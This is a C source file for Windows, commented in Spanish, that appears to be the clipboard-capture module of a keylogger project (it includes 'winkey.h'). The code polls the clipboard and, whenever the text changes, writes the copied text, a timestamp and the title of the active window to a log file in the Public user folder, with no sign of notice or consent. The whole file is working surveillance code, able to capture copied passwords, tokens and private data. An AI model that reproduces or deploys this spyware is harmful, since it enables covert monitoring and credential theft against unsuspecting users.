#include "winkey.h"

t_ClipboardState g_clipboardState = {0};

// Abre/crea C:\Users\Public\clipboard.log

BOOL OpenClipboardLog(void)
{
    char        logPath[MAX_PATH];
    time_t      currentTime;
    struct tm   timeInfo;

    // Crear la ruta completa del archivo de log clipboard
    snprintf(logPath, sizeof(logPath), "C:\\Users\\Public\\clipboard.log");

    // Abrir el archivo de log de forma segura
    if (fopen_s(&g_clipboardState.clipboardFile, logPath, "ab+") != 0 || !g_clipboardState.clipboardFile)
        return FALSE;

    // Escribir BOM si está vacío
    if (fseek(g_clipboardState.clipboardFile, 0, SEEK_END) == 0) {
        long size = ftell(g_clipboardState.clipboardFile);
        if (size == 0) {
            unsigned char bom[3] = {0xEF,0xBB,0xBF};
            fwrite(bom,1,3,g_clipboardState.clipboardFile);
        }
    }

    // Obtener tiempo actual y escribir cabecera de inicio
    time(&currentTime);
    localtime_s(&timeInfo, &currentTime);

    fprintf(g_clipboardState.clipboardFile,
            "\n=== Clipboard Log Start: %02d/%02d/%04d %02d:%02d:%02d ===\n",
            timeInfo.tm_mday, timeInfo.tm_mon + 1, timeInfo.tm_year + 1900,
            timeInfo.tm_hour, timeInfo.tm_min, timeInfo.tm_sec);
    fflush(g_clipboardState.clipboardFile);
    (void)logPath; // Evita warning si no se usa
    return TRUE;
}

// Cierra el archivo log del clipboard
void CloseClipboardLog(void)
{
    if (g_clipboardState.clipboardFile) {
        fprintf(g_clipboardState.clipboardFile, "=== Clipboard Log End ===\n");
        fflush(g_clipboardState.clipboardFile);
        fclose(g_clipboardState.clipboardFile);
        g_clipboardState.clipboardFile = NULL;
    }
}

// Obtiene el titulo de la ventana activa
static BOOL getActiveWindowTitle(char *buffer, size_t bufSize)
{
    HWND    activeWindow;
    int     titleLength;

    activeWindow = GetForegroundWindow();
    if (!activeWindow)
        return FALSE;
    
    WCHAR wTitle[256];
    titleLength = GetWindowTextW(activeWindow, wTitle, (int)(sizeof(wTitle)/sizeof(WCHAR)));
    if (titleLength <= 0) {
        strcpy_s(buffer, bufSize, "Unknown Window");
        return FALSE;
    }
    if (WideCharToMultiByte(CP_UTF8, 0, wTitle, -1, buffer, (int)bufSize, NULL, NULL) <= 0) {
        strcpy_s(buffer, bufSize, "Unknown Window");
        return FALSE;
    }
    return TRUE;
}

// Escribe timestamp + ventana activa + texto nuevo
static void writeClipboardEntry(const char *text, const char *windowTitle)
{
    time_t      currentTime;
    struct tm   timeInfo;

    time(&currentTime);
    localtime_s(&timeInfo, &currentTime);
    fprintf(g_clipboardState.clipboardFile,
            "[%04d-%02d-%02d %02d:%02d:%02d] - Window: '%s'\n%s\n\n",
        timeInfo.tm_year + 1900, timeInfo.tm_mon + 1, timeInfo.tm_mday,
        timeInfo.tm_hour, timeInfo.tm_min, timeInfo.tm_sec, windowTitle, text);
    fflush(g_clipboardState.clipboardFile);
}

// Obtiene texto (UTF-16 -> UTF-8 simple) del portapapeles
// Devuelve TRUE si no hay texto valido
static BOOL getClipboardText(char *buffer, size_t bufSize)
{
    HGLOBAL         hData;
    const wchar_t   *wdata;
    int             len;

    if (!OpenClipboard(NULL))
        return FALSE;

    hData = GetClipboardData(CF_UNICODETEXT);
    if (!hData) {
        CloseClipboard();
        return FALSE;
    }

    wdata = (const wchar_t*)GlobalLock(hData);
    if (!wdata) {
        CloseClipboard();
        return FALSE;
    }

    len = WideCharToMultiByte(CP_UTF8, 0, wdata, -1, buffer, (int)bufSize, NULL, NULL);
    GlobalUnlock(hData);
    CloseClipboard();
    
    return (len > 1);
}

// Comprueba si el texto cambió y lo registra
void LogClipboardIfChanged(void)
{
    char    current[512];
    char    windowTitle[256];

    if (!g_clipboardState.clipboardFile) {
        if (!OpenClipboardLog())
            return ;
    }

    if (!getClipboardText(current, sizeof(current)))
        return ;

    if (strcmp(current, g_clipboardState.lastClipboardText) == 0)
        return ;

    getActiveWindowTitle(windowTitle, sizeof(windowTitle));
    writeClipboardEntry(current, windowTitle);
    strcpy_s(g_clipboardState.lastClipboardText, sizeof(g_clipboardState.lastClipboardText), current);
}
